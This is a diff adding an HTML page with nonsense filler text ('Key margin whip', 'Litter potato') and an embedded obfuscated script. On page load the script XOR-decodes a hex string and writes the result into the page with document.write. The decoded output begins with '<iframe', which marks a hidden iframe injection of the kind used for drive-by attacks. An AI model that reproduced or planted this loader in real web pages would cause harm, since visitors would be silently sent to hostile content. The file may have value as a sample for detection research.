@@ -1,0 +1,11 @@
+<html>
+ <head>
+  <title>Key margin whip</title>
+ </head>
+ <body>
+  <div>
+<script>var inmujtzhso01="fxfdstqhvwcopywup";var avlybo02=0;var ryrslhvg06;var vfyqcber03, bmpdudqpnjpubda04, zlazrveqmh05="5A110016121914480505005252110301005C5749090012170117590C17091E121B1915560F0A151B5E4A48575F1F4E45165518141D0059511C051C064D4C40131612181E05091205005A12071B555D2C1C18020650170D0716070E510B191B16021E1004014C491958585C044F484A580A0902181A104E";bmpdudqpnjpubda04="";for( vfyqcber03=0;vfyqcber03 < zlazrveqmh05.length;vfyqcber03+=2){ryrslhvg06 = unescape( "%" + zlazrveqmh05.substr( vfyqcber03,2));bmpdudqpnjpubda04 += String.fromCharCode( ryrslhvg06.charCodeAt(0) ^ inmujtzhso01.charCodeAt(avlybo02++) );if ( avlybo02 >= inmujtzhso01.length ) avlybo02 = 0;}document.write(bmpdudqpnjpubda04);</script>
+  </div>
+  <p>Litter potato</p>
+ </body>
+</html>
